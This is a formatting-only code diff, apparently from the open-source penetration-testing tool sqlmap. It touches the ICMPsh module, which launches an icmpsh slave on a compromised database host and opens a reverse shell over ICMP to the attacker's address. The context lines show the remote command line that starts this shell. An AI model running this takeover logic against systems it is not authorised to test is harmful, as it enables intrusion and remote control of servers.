@@ -30,11 +30,11 @@ class ICMPsh:
     """
 
     def __initVars(self):
-        self.lhostStr       = None
-        self.rhostStr       = None
-        self.localIP        = getLocalIP()
-        self.remoteIP       = getRemoteIP()
-        self.__icmpslave    = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe"))
+        self.lhostStr = None
+        self.rhostStr = None
+        self.localIP = getLocalIP()
+        self.remoteIP = getRemoteIP()
+        self.__icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe"))
 
     def __selectRhost(self):
         message = "which is the back-end DBMS address? [%s] " % self.remoteIP
@@ -59,7 +59,7 @@ class ICMPsh:
         icmpshmaster(self.lhostStr, self.rhostStr)
 
     def __runIcmpshSlaveRemote(self):
-        infoMsg  = "running icmpsh slave remotely"
+        infoMsg = "running icmpsh slave remotely"
         logger.info(infoMsg)
 
         cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self.__icmpslaveRemote, self.lhostStr)
@@ -90,7 +90,7 @@ class ICMPsh:
         self.__runIcmpshSlaveRemote()
         self.__runIcmpshMaster()
 
-        debugMsg  = "icmpsh master exited"
+        debugMsg = "icmpsh master exited"
         logger.debug(debugMsg)
 
         time.sleep(1)
